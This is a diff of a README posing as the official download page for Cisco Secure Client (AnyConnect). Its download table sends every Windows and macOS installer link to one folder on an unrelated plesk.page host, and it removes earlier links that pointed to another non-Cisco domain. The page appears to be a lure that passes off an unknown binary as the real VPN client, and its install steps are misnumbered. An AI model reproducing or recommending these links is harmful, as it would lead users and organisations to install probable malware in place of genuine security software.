@@ -1,28 +1,38 @@
-# Cisco Secure Client
+# Download Cisco Secure Client
 
-**Cisco Secure Client (including AnyConnect)** is an advanced, unified security solution designed to enhance your organization's connectivity and safeguard its digital assets. Formerly known as Cisco AnyConnect, this versatile tool integrates VPN access, endpoint protection, and telemetry capabilities, enabling seamless and secure connections for remote and mobile users. With robust features like multi-factor authentication, automated threat detection, and comprehensive device visibility, Cisco Secure Client ensures data integrity while optimizing network performance. Its user-friendly interface and compatibility across platforms make it a reliable choice for organizations prioritizing security and operational efficiency in today’s dynamic digital landscape.
+**Cisco Secure Client (including AnyConnect)** is a unified solution for enhanced connectivity and digital asset protection. It combines VPN, endpoint protection, and telemetry for secure remote access. With multi-factor authentication, threat detection, and device visibility, it ensures data security and network performance. Its intuitive interface and cross-platform compatibility make it a top choice for security-focused organizations.
 
-## Table of Contents
-- [Installation](#installation)
+- [Download Cisco Secure Client](#download-cisco-secure-client)
+- [Install Cisco Secure Client](#install-cisco-secure-client)
 - [System Requirements](#system-requirements)
 - [Configuration](#configuration)
 - [Troubleshooting](#troubleshooting)
 - [Features](#features)
 - [Usage](#usage)
+## Download Cisco Secure Client
+| Platform | Type             | Download                                                                                                                                                                                                                             |
+| -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows  | Standard Installer   | [64-bit version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) [ARM64 version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/)                                                                                          |
+|          | System Installer | [64-bit version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) [ARM64 version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/)                                                                                        |
+|          | .zip             | [64-bit version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) [ARM64 version](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/)                                                                                          |
+| macOS    | .zip             | [Universal](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) [Intel Chip](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) [Apple Silicon](https://nervous-dhawan.95-111-251-70.plesk.page/bin1/) |
+| Linux    | .tar.gz          | [64-bit version](*)                                                                                                                                                                 |
+|          | .deb             | [64-bit version](*)                                                                                                                                                               |
+|          | .rpm             | [64-bit version](*)   
 
-## Installation
-### Installing on Windows
-###  [**Download Cisco Secure Client**](https://cine.prosuscorp.com/seccure/)
-1. Run the installer and follow the on-screen prompts.
-2. Configure the client based on your organization’s requirements. For detailed installation and configuration steps, refer to the Installation and Setup Guide.
 
+
+## Install Cisco Secure Client
 ### Installing on macOS
-1. [**Download `.dmg` file**](https://cine.prosuscorp.com/secure/)
-2. Open the installer and follow the steps:
+1. Open the installer and follow the steps:
    - Agree to the Software License Agreement.
    - Enter your system password if required.
-3. Enable required permissions in **System Preferences > Security & Privacy**.
+2. Enable required permissions in **System Preferences > Security & Privacy**.
 4. Restart the macOS device if prompted.
+
+### Installing on Windows
+1. Run the installer and follow the on-screen prompts.
+2. Configure the client based on your organization’s requirements. For detailed installation and configuration steps, refer to the Installation and Setup Guide.
 
 
 ## System Requirements
